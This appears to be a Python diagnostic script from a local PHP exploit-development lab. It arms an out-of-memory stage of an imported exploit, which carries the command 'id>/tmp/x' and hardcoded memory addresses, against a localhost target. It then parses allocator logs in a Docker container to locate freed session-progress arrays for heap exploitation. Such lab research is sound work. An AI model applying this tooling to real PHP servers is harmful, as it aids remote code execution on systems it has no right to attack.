#!/usr/bin/env python3
"""diag_free.py — does the progress array (PS(http_session_vars)) get FREED after OOM arming on stock?"""
import subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402

CHUNK = 0x7ffffe000000
t = alv.Target("http://localhost:18110/index.php", timeout=150)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

def clear_log():
    subprocess.run(["docker", "exec", "p2s", "sh", "-c", ": > /tmp/alloc_all.log 2>/dev/null || touch /tmp/alloc_all.log"])
def read_log():
    return subprocess.run(["docker", "exec", "p2s", "cat", "/tmp/alloc_all.log"], capture_output=True).stdout.decode("latin1").splitlines()

# arm with the WORKING stage-1 shape, then inspect frees in main chunk (esp. late = shutdown)
clear_log(); time.sleep(0.3)
ex._oom(b"x")
time.sleep(0.6)
lines = read_log()
print(f"total log lines after _oom(x): {len(lines)}")

# collect allocs and frees in main chunk, with sequence numbers
allocs = {}   # addr -> (seq, size)
frees = []    # (seq, addr)
seq = 0
for ln in lines:
    p = ln.split()
    if not p: continue
    op = p[0]
    try:
        if op == "M" and len(p) >= 3:
            size, addr = int(p[1]), int(p[2], 16); allocs[addr] = (seq, size); seq += 1
        elif op == "R" and len(p) >= 4:
            ptr, size, naddr = p[1], int(p[2]), int(p[3], 16); allocs[naddr] = (seq, size); seq += 1
        elif op == "F" and len(p) >= 2:
            addr = int(p[1], 16); frees.append((seq, addr)); seq += 1
    except ValueError:
        pass

# frees whose address was a main-chunk alloc of HashTable-ish size (>=48), i.e. candidate progress arrays
print("\n=== late-phase frees in main chunk (size>=48) — candidates for the freed progress array ===")
late = []
for s, addr in frees:
    off = addr - CHUNK
    if 0 <= off < (1 << 21):
        a = allocs.get(addr)
        sz = a[1] if a else None
        if sz is not None and sz >= 48:
            late.append((s, off, sz))
late.sort()
for s, off, sz in late[-60:]:
    print(f"   seq={s} freed off=0x{off:x} (was size {sz})")
print(f"\ntotal main-chunk frees of >=48B blocks: {len(late)}")
